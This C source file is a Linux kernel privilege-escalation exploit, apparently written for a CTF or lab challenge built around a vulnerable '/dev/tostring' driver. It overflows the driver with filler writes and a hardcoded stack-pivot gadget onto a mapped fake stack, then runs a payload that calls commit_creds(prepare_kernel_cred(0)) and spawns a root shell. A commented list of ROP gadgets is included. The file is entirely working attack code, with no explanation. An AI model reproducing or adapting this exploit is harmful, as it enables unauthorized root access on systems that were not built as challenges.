#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#define DEVICE_FILE "/dev/tostring"
typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef int __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func)0xc1070e80 ;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func)0xc10711f0 ;
int fd;
unsigned long long int filler=0x4141414141414141;
unsigned long long pivot=0xc12a8c7c;
void *base=0x5d5bf000;
void *stack=0x5d5bffde;
/*
p=0xc1387ccf;// adc al, 0x68 ; mov esp, 0x68c1ae92 ; retf
p=0xc138ab13 : mov esp, 0x8a1c4389 ; inc ebp ; ret
p=0xc12a8c7c :  mov esp, 0x5d5bffde ; ret
p=0xc109c92e : adc bh, al ; add al, 0x24 ; mov esp, 0x89c1a839 ; ret 0xe8c1
p=0xc109c930 : add al, 0x24 ; mov esp, 0x89c1a839 ; ret 0xe8c1
p=0xc1348791 : add al, 0x5c ; mov esp, 0x3c89c1aa ; and al, 0xe8 ; ret 0x1a0f
p=0xc128d5b4 : add al, 0x8b ; xchg eax, esi ; mov esp, 0xf000000 ; retf 0x5089
p=0xc17308a6 : add al, byte ptr [eax] ; add byte ptr [edi], cl ; mov esp, 0x440f0846 ; ret 0xc083
p=0xc1744b23 : add al, ch ; out dx, al ; mov esp, 0x75c085ff ; retf
*/
void payload(){
	commit_creds(prepare_kernel_cred(0));
	system("/bin/sh");
}
void Exit(char *msg){
	perror(msg);
	exit(EXIT_FAILURE);
}
void Open(){
	fd=open(DEVICE_FILE,O_RDWR);
	if(fd<0){
		Exit("[-] open failed");
	}
}
void write_64(unsigned long long rip){
	write(fd,(char *)&rip,8);
}
void exploit(){
	Open();
	if(!mmap(base,0x3000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,-1,0)){
		Exit("[-] mmap failed");
	}
	memset(base,0,0x3000);
	unsigned int ropchain[]={payload};
	memcpy(stack,ropchain,sizeof(ropchain));
	for(int i=0;i<0x40;i++){
		write_64(filler);
	}
	write_64(pivot);
	read(fd,NULL,0);
}
int main(){
	exploit();
	return 0;
}
